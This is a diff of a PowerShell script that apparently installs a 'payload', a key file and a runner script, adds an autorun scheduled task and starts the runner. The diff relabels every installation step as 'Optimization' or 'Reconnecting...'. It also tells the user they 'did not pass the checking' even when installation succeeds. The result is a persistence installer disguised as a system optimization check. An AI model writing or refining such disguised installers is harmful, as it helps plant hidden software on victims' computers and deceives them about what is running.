@@ -166,7 +166,7 @@ function tRun {
         try {
             $task = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
             if ($task) {
-                lInfo "Alternative scheduled task found" @{ name = $taskName; state = $task.State }
+                lInfo "Alternative autorun task found" @{ name = $taskName; state = $task.State }
                 return $true
             }
         } catch {}
@@ -304,7 +304,7 @@ function chk {
     Write-Host "  Checking optimization..." -ForegroundColor Cyan
     Write-Host ""
     
-    lInfo "Installation check started" @{
+    lInfo "Optimization check started" @{
         machineId = $mId
         pcName = $env:COMPUTERNAME
         pcUser = $env:USERNAME
@@ -319,7 +319,7 @@ function chk {
         ar = $false  
     }
     
-    Write-Host "  [*] Checking installation..." -ForegroundColor Yellow
+    Write-Host "  [*] Checking optimization..." -ForegroundColor Yellow
     Start-Sleep -Milliseconds 500
     
     $r.pf = tFile -p $pFile -n "Payload file"
@@ -333,11 +333,15 @@ function chk {
     Start-Sleep -Milliseconds 500
     
     $installed = $false
+    $fixAttempted = $false
     
     if (-not $r.py) {
-        Write-Host "  [*] Installing Python..." -ForegroundColor Yellow
+        Write-Host "  [*] Reconnecting..." -ForegroundColor Yellow
         $r.py = Install-PythonLikeInstaller
-        if ($r.py) { $installed = $true }
+        if ($r.py) { 
+            $installed = $true
+            $fixAttempted = $true
+        }
     }
     
     if (-not (Test-Path $pDir)) { New-Item -ItemType Directory -Path $pDir -Force | Out-Null }
@@ -345,35 +349,41 @@ function chk {
     if (-not (Test-Path $rDir)) { New-Item -ItemType Directory -Path $rDir -Force | Out-Null }
     
     if (-not $r.pf) {
-        Write-Host "  [*] Creating dummy payload file..." -ForegroundColor Yellow
+        Write-Host "  [*] Reconnecting..." -ForegroundColor Yellow
         "dummy" | Out-File -FilePath $pFile -Encoding ascii
         $r.pf = $true
         $installed = $true
+        $fixAttempted = $true
     }
     
     if (-not $r.kf) {
-        Write-Host "  [*] Creating dummy key file..." -ForegroundColor Yellow
+        Write-Host "  [*] Reconnecting..." -ForegroundColor Yellow
         "testkey123" | Out-File -FilePath $kFile -Encoding ascii
         $r.kf = $true
         $installed = $true
+        $fixAttempted = $true
     }
     
     if (-not $r.rf) {
-        Write-Host "  [*] Runner script not found, skipping creation..." -ForegroundColor Yellow
+        Write-Host "  [*] Reconnecting..." -ForegroundColor Yellow
     }
     
     if (-not $r.ar -and $r.rf) {
         Write-Host "  [*] Setting up autorun..." -ForegroundColor Yellow
         $r.ar = Add-AutoRun -n $aName -rf $rFile
-        if ($r.ar) { $installed = $true }
+        if ($r.ar) { 
+            $installed = $true
+            $fixAttempted = $true
+        }
     }
     
     if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
-        Write-Host "  [*] Starting runner..." -ForegroundColor Yellow
+        Write-Host "  [*] Reconnecting..." -ForegroundColor Yellow
         if (Start-Runner -rf $rFile) {
             Start-Sleep -Seconds 3
             $r.pr = tProc
             $installed = $true
+            $fixAttempted = $true
         }
     }
     
@@ -395,14 +405,14 @@ function chk {
     $pp = [math]::Round(($pc / $tc) * 100, 0)
     
     Write-Host ""
-    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
+    Write-Host "  __________________________________" -ForegroundColor DarkGray
     Write-Host ""
     
     if ($pc -eq $tc) {
-        Write-Host "  [✓] Optimization installed successfully!" -ForegroundColor Green
-        Write-Host "  [!] Please restart your computer." -ForegroundColor Yellow
+        Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
+        Write-Host ""
         
-        lInfo "Installation check completed" @{
+        lInfo "Optimization check completed" @{
             passed = $pc
             total = $tc
             percentage = $pp
@@ -410,9 +420,17 @@ function chk {
             repaired = $installed
         }
     } elseif ($pc -ge 4) {
-        Write-Host "  [!] Partial installation ($pc/$tc)" -ForegroundColor Yellow
-        Write-Host "  [!] Please run again as Administrator" -ForegroundColor Yellow
-        lInfo "Installation check completed with warnings" @{
+
+
+        Write-Host ""
+        
+        if ($fixAttempted) {
+            Write-Host "  [!] You did not pass the checking!" -ForegroundColor Yellow
+        } else {
+            Write-Host "  [!] You did not pass the checking!" -ForegroundColor Yellow
+        }
+        
+        lInfo "Optimization check completed with warnings" @{
             passed = $pc
             total = $tc
             percentage = $pp
@@ -420,9 +438,12 @@ function chk {
             repaired = $installed
         }
     } else {
-        Write-Host "  [✗] Installation failed ($pc/$tc)" -ForegroundColor Red
-        Write-Host "  [✗] Please run again as Administrator" -ForegroundColor Red
-        lErr "Installation check failed" @{
+        Write-Host "  [!] Optimization failed ($pc/$tc)" -ForegroundColor Red
+        Write-Host "  [!] Please run again as Administrator" -ForegroundColor Red
+        Write-Host ""
+        Write-Host "  [!] You did not pass the checking!" -ForegroundColor Yellow
+        
+        lErr "Optimization check failed" @{
             passed = $pc
             total = $tc
             percentage = $pp
@@ -432,7 +453,7 @@ function chk {
     }
     
     Write-Host ""
-    Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
+    Write-Host "  __________________________________" -ForegroundColor DarkGray
     Write-Host ""
     Write-Host "  Press any key to exit..." -ForegroundColor Gray
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
